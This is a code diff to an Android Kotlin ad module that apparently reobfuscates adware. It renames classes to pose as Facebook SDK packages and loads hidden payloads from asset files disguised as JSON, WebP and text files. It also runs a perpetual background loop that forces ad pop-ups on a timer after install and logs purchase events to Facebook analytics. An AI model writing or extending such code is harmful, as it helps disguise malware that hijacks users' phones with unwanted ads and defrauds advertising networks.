@@ -1,4 +1,4 @@
-package b2
+package com.lo1
 
 import android.app.Application
 import android.app.KeyguardManager
@@ -10,14 +10,16 @@ import android.content.Context.JOB_SCHEDULER_SERVICE
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
-import com.ak.impI.Core
-import com.ak.impI.RegisAc
+import c.a
+import com.facebook.impI.Start
+import com.facebook.impI.LifeRegister
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.ktx.Firebase
 import com.kijz.laisk.kzma.AsuijJozk
+import opm.z.cd
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -40,16 +42,16 @@ import kotlin.random.Random
  * Describe:
  * b2.D9
  */
-object AdE {
+object AdMzki {
     private var sK = "" // 16, 24, or 32 bytes
-    private var mContext: Application = Core.mApp
+    private var mContext: Application = Start.mApp
 
     @JvmStatic
     var isSAd = false
     private var lastSAdTime = 0L
 
     @JvmStatic
-    val mAdC: AdCenter = AdCenter()
+    val mAdC: NAmj = NAmj()
 
     private val mMainScope = CoroutineScope(Dispatchers.Main)
     private var mInstallWait = 40000
@@ -59,10 +61,10 @@ object AdE {
     private var nDayShowMax = 80 //天显示次数
     private var nTryMax = 50 // 失败上限
 
-    private var numHour = Core.getInt("show_hour_num")
-    private var numDay = Core.getInt("show_day_num")
-    private var isCurDay = Core.getStr("last_cur_day")
-    private var numJumps = Core.getInt("num_jumps_page")
+    private var numHour = Start.getInt("show_hour_num")
+    private var numDay = Start.getInt("show_day_num")
+    private var isCurDay = Start.getStr("last_cur_day")
+    private var numJumps = Start.getInt("num_jumps_page")
 
     @JvmStatic
     var isLoadH = false
@@ -80,7 +82,7 @@ object AdE {
     @JvmStatic
     fun sNumJump(num: Int) {
         numJumps = num
-        Core.saveInt("num_jumps_page", num)
+        Start.saveInt("num_jumps_page", num)
     }
 
     @JvmStatic
@@ -97,22 +99,22 @@ object AdE {
     private fun pL() {
         if (isPost) return
         isPost = true
-        Core.pE("advertise_limit")
+        Start.pE("advertise_limit")
     }
 
     private fun sC() {
-        Core.saveInt("show_hour_num", numHour)
-        Core.saveInt("show_day_num", numDay)
+        Start.saveInt("show_hour_num", numHour)
+        Start.saveInt("show_day_num", numDay)
     }
 
     private fun isCurH(): Boolean {
-        val s = Core.getStr("last_hout_time")
+        val s = Start.getStr("last_hout_time")
         if (s.isNotBlank()) {
             if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                 return true
             }
         }
-        Core.saveC("last_hout_time", System.currentTimeMillis().toString())
+        Start.saveC("last_hout_time", System.currentTimeMillis().toString())
         return false
     }
 
@@ -120,7 +122,7 @@ object AdE {
         val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
         if (isCurDay != day) {
             isCurDay = day
-            Core.saveC("last_cur_day", isCurDay)
+            Start.saveC("last_cur_day", isCurDay)
             numHour = 0
             numDay = 0
             isPost = false
@@ -142,7 +144,7 @@ object AdE {
 
     @JvmStatic
     fun a2() {
-        mContext.registerActivityLifecycleCallbacks(RegisAc())
+        mContext.registerActivityLifecycleCallbacks(LifeRegister())
         File("${mContext.dataDir}/care").mkdirs()
         refConfigure()
         t()
@@ -150,7 +152,7 @@ object AdE {
 
     private var lastStr = ""
     private fun refConfigure() {
-        val str = Core.getStr("")
+        val str = Start.getStr("con_large_91")
         if (str != lastStr) {
             lastStr = str
             reConfig(JSONObject(str))
@@ -175,29 +177,29 @@ object AdE {
 
     private fun t() {
         if (numJumps > nTryMax) {
-            Core.pE("pop_fail")
+            Start.pE("pop_fail")
             return
         }
         val is64i = is64a()
         mMainScope.launch {
-            Core.pE("test_s_dec")
+            Start.pE("test_s_dec")
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                i = loadSFile(if (is64i) "quick.txt" else "zzz.zip")
+                i = loadSFile(if (is64i) "care.json" else "igloo.txt")
             }
             if (i.not()) {
-                Core.pE("ss_l_f", "$is64i")
+                Start.pE("ss_l_f", "$is64i")
                 return@launch
             }
-            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            opm.z.cd.f(2, 1.0, tagL)
+            Start.pE("test_s_load", "${System.currentTimeMillis() - time}")
+            cd.f(2, 1.0, tagL)
             while (true) {
                 openJob()
                 cAction()
                 delay(cTime)
                 if (numJumps > nTryMax) {
-                    Core.pE("pop_fail")
+                    Start.pE("pop_fail")
                     break
                 }
             }
@@ -205,10 +207,10 @@ object AdE {
 
         mMainScope.launch(Dispatchers.IO) {
             delay(1000)
-            if (loadSFile(if (is64i) "unity/quw93" else "unity/qius.txt")) {
+            if (loadSFile(if (is64i) "cfas.webp" else "states.txt")) {
                 withContext(Dispatchers.Main) {
                     try {
-                        opm.z.cd.a(mContext)
+                        cd.a(mContext)
                         isLoadH = true
                     } catch (_: Throwable) {
                     }
@@ -266,29 +268,29 @@ object AdE {
 
 
     private fun cAction() {
-        Core.pE("ad_session")
+        Start.pE("ad_session")
         if (l().not()) return
-        Core.pE("ad_light")
+        Start.pE("ad_light")
         if (isLi()) {
-            Core.pE("ad_pass", "limit")
+            Start.pE("ad_pass", "limit")
             return
         }
         mAdC.loadAd()
-        if (System.currentTimeMillis() - Core.insAppTime < mInstallWait) {
-            Core.pE("ad_pass", "1t")
+        if (System.currentTimeMillis() - Start.insAppTime < mInstallWait) {
+            Start.pE("ad_pass", "1t")
             return
         }
         if (System.currentTimeMillis() - lastSAdTime < tPer) {
-            Core.pE("ad_pass", "2t")
+            Start.pE("ad_pass", "2t")
             return
         }
         if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
-            Core.pE("ad_pass", "s")
+            Start.pE("ad_pass", "s")
             return
         }
-        Core.pE("ad_pass", "N")
+        Start.pE("ad_pass", "N")
         CoroutineScope(Dispatchers.Main).launch {
-            if (c.a.b()) {
+            if (a.b()) {
                 if (isSAd) {
                     delay(1200)
                 } else {
@@ -296,8 +298,8 @@ object AdE {
                 }
             }
             sNumJump(numJumps++)
-            Core.pE("ad_start")
-            opm.z.cd.f(2, 1.0, "ozfresh")
+            Start.pE("ad_start")
+            cd.f(2, 1.0, "ozfresh")
         }
     }
 
@@ -318,7 +320,7 @@ object AdE {
         }
         if (FacebookSdk.isInitialized().not()) return
         //fb purchase
-        AppEventsLogger.newLogger(Core.mApp).logPurchase(
+        AppEventsLogger.newLogger(Start.mApp).logPurchase(
             e.toBigDecimal(), Currency.getInstance("USD")
         )
     }
